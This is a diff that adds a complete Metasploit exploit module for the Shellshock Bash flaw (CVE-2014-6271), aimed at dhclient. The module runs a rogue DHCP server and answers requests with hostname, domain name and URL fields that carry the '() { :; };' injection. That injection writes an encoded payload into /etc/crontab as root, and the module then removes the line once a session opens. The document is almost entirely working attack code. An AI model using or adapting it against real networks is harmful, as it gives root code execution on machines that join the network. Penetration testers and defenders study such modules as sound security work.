@@ -1,0 +1,93 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex/proto/dhcp'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::DHCPServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Dhclient Bash Environment Variable Injection (Shellshock)',
+      'Description'    => %q|
+        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
+        handles external environment variables. This module targets dhclient by responding
+        to DHCP requests with a malicious hostname, domainname, and URL which are then
+        passed to the configuration scripts as environment variables, resulting in code
+        execution. Due to length restrictions and the unusual networking scenario at the
+        time of exploitation, this module achieves code execution by writing the payload
+        into /etc/crontab and then cleaning it up after a session is created.
+      |,
+      'Author'         =>
+        [
+          'Stephane Chazelas', # Vulnerability discovery
+          'egypt' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'References'     =>
+        [
+          ['CVE', '2014-6271'],
+          ['CWE', '94'],
+          ['OSVDB', '112004'],
+          ['EDB', '34765'],
+          ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
+          ['URL', 'http://seclists.org/oss-sec/2014/q3/649'],
+          ['URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/']
+        ],
+      'Payload'        =>
+        {
+          # 255 for a domain name, minus some room for encoding
+          'Space'       => 200,
+          'DisableNops' => true,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic telnet ruby',
+            }
+        },
+      'Targets'        => [ [ 'Automatic Target', { }] ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Sep 24 2014'
+    ))
+
+    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
+  end
+
+  def on_new_session(session)
+    print_status "Cleaning up crontab"
+    # XXX this will brick a server some day
+    session.shell_command_token("sed -i '/^\\* \\* \\* \\* \\* root/d' /etc/crontab")
+  end
+
+  def exploit
+    hash = datastore.copy
+    # Quotes seem to be completely stripped, so other characters have to be
+    # escaped
+    p = payload.encoded.gsub(/([<>()|'&;$])/) { |s| Rex::Text.to_hex(s) }
+    echo = "echo -e #{(Rex::Text.to_hex("*") + " ") * 5}root #{p}>>/etc/crontab"
+    hash['DOMAINNAME'] = "() { :; };#{echo}"
+    if hash['DOMAINNAME'].length > 255
+      raise ArgumentError, 'payload too long'
+    end
+
+    hash['HOSTNAME'] = "() { :; };#{echo}"
+    hash['URL'] = "() { :; };#{echo}"
+    start_service(hash)
+
+    begin
+      while @dhcp.thread.alive?
+        sleep 2
+      end
+    ensure
+      stop_service
+    end
+  end
+
+end
